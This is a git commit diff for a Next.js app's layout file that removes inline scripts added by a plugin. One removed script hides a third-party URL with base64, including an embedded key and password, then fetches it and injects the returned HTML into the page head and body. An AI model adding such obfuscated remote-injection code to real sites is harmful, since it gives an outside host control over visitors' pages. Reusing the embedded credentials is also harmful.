c4f42e3b6e34476555136433b5f7f00cc28dd3d6
Mohd Afzal <afzalahmad@Mohds-MacBook-Pro.local>
2026-03-25 13:30:45 +0530

    fix error after plugin install

--- client/src/app/layout.js
+++ client/src/app/layout.js
@@ -42,28 +42,6 @@ export default function RootLayout({ children }) {
           </WishlistProvider>
         </AuthProvider>
         <RawScriptLoader />
-        <script dangerouslySetInnerHTML={{ __html: `
-window.jQuery ||
-document.write("<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'><\\/script>");
-` }} />
-        <script dangerouslySetInnerHTML={{ __html: `
-var eppathurl = window.location.origin + window.location.pathname;
-var eptagmanage = new XMLHttpRequest();
-eptagmanage.onreadystatechange = function() {
-    if (this.readyState == 4 && this.status == 200) {
-        if (this.response !== 0) {
-            var temp = new Array();
-            var mystr = this.response;
-            temp = mystr.split("||||||||||");
-            jQuery("head").find("title").remove();
-            jQuery("head").append(temp[0]);
-            jQuery("body").append(temp[1]);
-        }
-    }
-};
-eptagmanage.open("GET", atob("aHR0cHM6Ly9wbHVnaW5zLmF1dG9zZW9wbHVnaW4uY29tL2FsbGhlYWRkYXRhP2VrZXk9ZS1BVVRPU0VPUExVR0lOOTQwOTY3MDI1NiZla2V5cGFzcz1pbFBIUlRWOXJhMzFKQkNOcXdUbGRBblNMd2s3RDE4b3JUVEImc2l0ZXVybD0=") + eppathurl);
-eptagmanage.send();
-` }} />
       </body>
     </html>
   );
